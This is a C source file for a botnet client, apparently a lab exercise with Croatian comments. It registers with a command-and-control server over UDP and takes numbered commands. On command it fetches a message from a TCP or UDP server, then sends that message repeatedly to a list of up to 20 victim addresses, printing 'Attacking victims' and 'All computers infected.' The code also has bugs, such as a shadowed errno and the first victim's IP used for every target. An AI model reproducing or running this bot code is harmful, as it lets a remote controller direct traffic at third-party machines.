#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>

#define MAXLEN 1024

int Socket (int family, int type, int proto) {
	int mySock;
	int errno;
	mySock = socket(family, type, proto);
	if (mySock<0) {
		fprintf(stderr, "Error: %s\n", strerror(errno));
		exit(1);
	} else {
		return mySock;
	}
}

int Bind (int sockfd, const struct sockaddr *myaddr, int addrlen) {
	int myBind;
	int errno;
	myBind = bind (sockfd, myaddr, addrlen);
	if (myBind!=0) {
		fprintf(stderr, "Error: %s\n", strerror(errno));
		exit(1);
	} else {
		return 0;
	}
}

void errorFunc (int e) {
	if(e<0){
		fprintf(stderr, "Error: %s\n", strerror(errno));
		exit(1);
	}
}

int main (int argc, char *argv[]) {
	char regmsg[10] = "REG\n";
	char hellomsg[10] = "HELLO\n";
	char msgfromudp[MAXLEN];
	char ccport[30];
	char ccip[30];
	struct addrinfo hints, *res;
	struct sockaddr_in ccaddr, udpaddr, tcpaddr, infectedaddr;
	socklen_t cclen;
	socklen_t udplen = sizeof(udpaddr);
	socklen_t tcplen;
	int e, udpsock, tcpsock, i, j;
	udpaddr.sin_family = AF_INET;
	
	if (argc!=3) {
		fprintf(stderr, "Usage: ./bot server_ip server_port\n");
		exit(1);
	}
	
	//C&C
	strcpy(ccip, argv[1]);
	strcpy(ccport, argv[2]);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_CANONNAME;
	
	e = getaddrinfo(ccip, ccport, &hints, &res);
	errorFunc(e);
	
	ccaddr.sin_family = AF_INET;
	ccaddr = *((struct sockaddr_in*)res->ai_addr);
	cclen = sizeof(ccaddr);
	
	udpsock = Socket(PF_INET, SOCK_DGRAM, 0);
	
	struct INFO {
		char IP[INET_ADDRSTRLEN];
		char port[22];
	};
	
	struct MSG {
		char command;
		struct INFO info[20];
	};
	
	struct MSG received;
	
	printf("Sending REG to C&C server.\n");
	e = sendto(udpsock, regmsg, strlen(regmsg), 0, (struct sockaddr *)&ccaddr, cclen);
	errorFunc(e);
	printf("C&C is sending message.\n");
	
	while(1) {
		for (i=0; i<20; i++) {
			memset(&received.info[i].IP[0], 0, sizeof(received.info[i].IP));
			memset(&received.info[i].port[0], 0, sizeof(received.info[i].port));
		}
		e = recvfrom(udpsock, &received, MAXLEN, 0, (struct sockaddr *)&ccaddr, &cclen);
		errorFunc(e);
		
		if (received.command=='0') {
			//QUIT
			printf("Primljena 0. Bot prestaje s radom.\n");
			return 0;
		} else if (received.command=='1') {
			memset(msgfromudp, 0, MAXLEN);
			//PROG_TCP
			tcpaddr.sin_family = AF_INET;
			inet_pton(AF_INET, &received.info[0].IP[0], &(tcpaddr.sin_addr.s_addr));
			tcpaddr.sin_port = htons(atoi(&received.info[0].port[0]));
			tcplen = sizeof(tcpaddr);
			
			tcpsock = Socket(PF_INET, SOCK_STREAM, 0);
		
			e = connect(tcpsock, (struct sockaddr*)&tcpaddr, tcplen);
			errorFunc(e);
		
			e = send (tcpsock, hellomsg, strlen(hellomsg), 0);
			errorFunc(e);
			
			printf("Server is sending messages.\n");
			e = recv (tcpsock, &msgfromudp, MAXLEN, 0);
			errorFunc(e);
			printf("Received message from server.\n");	
			
			close(tcpsock);			
		} else if (received.command=='2'){
			memset(msgfromudp, 0, MAXLEN);
			//PROG_UDP
			inet_pton(AF_INET, &received.info[0].IP[0], &(udpaddr.sin_addr.s_addr));
			udpaddr.sin_port = htons(atoi(&received.info[0].port[0]));
		
			//posalji hello UDP serveru
			e = sendto(udpsock, hellomsg, strlen(hellomsg), 0, (struct sockaddr *)&udpaddr, udplen);
			errorFunc(e);
		
			printf("Server is sending messages.\n");
			e = recvfrom (udpsock, &msgfromudp, MAXLEN, 0, (struct sockaddr *)&udpaddr, &udplen);
			errorFunc(e);
			printf("Received message from server.\n");		
		} else if (received.command=='3') {
			//salji poruke svim zrtavama 100 sekundi
			printf("Attacking victims.\n");
			char pom[MAXLEN];
			char delim[] = ":";
			char *ptr;

			for (j=0; j<10; j++){
				memset(pom, 0, MAXLEN);
				strcpy(pom, msgfromudp);
				ptr = strtok(pom, delim);
				while(ptr!=NULL) {	
					for (i=0; i<20; i++) {
						if(strcmp("", &(received.info[i].IP[0]))!=0){
							printf("Victim %d, IP: %s, PORT: %s\n", i, &received.info[i].IP[0], &received.info[i].port[0]);
							infectedaddr.sin_family = AF_INET;
							infectedaddr.sin_port = htons(atoi(&received.info[i].port[0]));
							inet_pton(AF_INET, &received.info[0].IP[0], &infectedaddr.sin_addr.s_addr);
							
							e=sendto(udpsock, ptr, strlen(ptr), 0, (struct sockaddr *)&infectedaddr, sizeof(infectedaddr));
							errorFunc(e);
											
						} else {
							ptr = strtok(NULL, delim);
							break;
						}	
					}	
				}
				sleep(1);		
			}
			printf("All computers infected.\n");
		} else if (received.command=='4') {
			return 0;
		}
	}
	return 0;
}
